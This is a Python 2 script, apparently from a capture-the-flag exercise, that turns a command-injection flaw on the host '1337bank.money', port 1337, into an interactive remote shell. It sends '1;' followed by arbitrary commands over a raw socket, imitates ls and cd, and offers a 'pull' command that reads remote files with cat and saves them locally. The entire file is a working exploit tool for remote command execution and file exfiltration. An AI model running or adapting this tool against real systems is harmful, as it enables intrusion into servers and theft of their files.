from cmd import Cmd
import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
            # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
    #print(data)             # Prints data
    s.send("1;"+cmd+"\n")   # Send a newline \n at the end of your command
    data = s.recv(1024)
    data = s.recv(1024)
    l = data.split("\n")

    for string in l:
        print string,
    print ""

curr = ""
class CMD(Cmd):
    prompt = '/> ' 
    def do_exit(self,inp):
        print("byebye")
        return True
    def do_cd(self,s):
        global curr
        curr += "/" + s
        self.prompt = curr +"> "
        
        if s == "":
            curr = ""
            self.prompt = "/> " 
        execute_cmd("cd " +curr+"/" + s)
    def do_ls(self,val):
        execute_cmd("ls " + curr )

    def default(self,arg):
        x = arg.split() 
        execute_cmd(x[0]+ " "+curr+ "/"+x[1] )

class ShellOne(Cmd):
    prompt = '> '
    def default(self,inp):
        print "enter a valid command below"
        print "pull(stringArg) -  takes in a string containing a path to a file in the remote directory and a file \nin your local directory. The function will then copy the contents from the remote file to the local one\n(e.g. pull \"bin/file.txt /mnt/c/Users/new.txt\") "
        print ""
        print "shell() -  takes you to an interactive shell where you can use UNIX commands."
        print ""
        print "quit() -  will exit the program"
        print ""
        print "help -  shows you this help menu"
    def do_quit(self,inp):
        print("bye")
        return True
    def do_shell(self,arg):
        CMD().cmdloop()
    def do_pull(self, args):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        a  = args.split()

        data = s.recv(1024)
       
        
        s.send("1; cat "+args+"\n")   # Send a newline \n at the end of your command
        data = s.recv(1024)
      
        data = s.recv(100000)
        file = open(a[1] , 'w+')
        file.write(data)
        file.close
        print "Writing the following lines to " + a[1]
        print data,
    def do_help(self,args):
        print "                                   Here is the help menu"
        print "========================================================================================================="
        print "                                         Commands"
        print "pull(stringArg) -  takes in a string containing a path to a file in the remote directory and a file \nin your local directory. The function will then copy the contents from the remote file to the local one\n(e.g. pull \"bin/file.txt /mnt/c/Users/new.txt\") "
        print ""
        print "shell() -  takes you to an interactive shell where you can use UNIX commands."
        print ""
        print "quit() -  will exit the program"
        print ""
        print "help -  shows you this help menu"

if __name__ == '__main__':
    ShellOne().cmdloop()
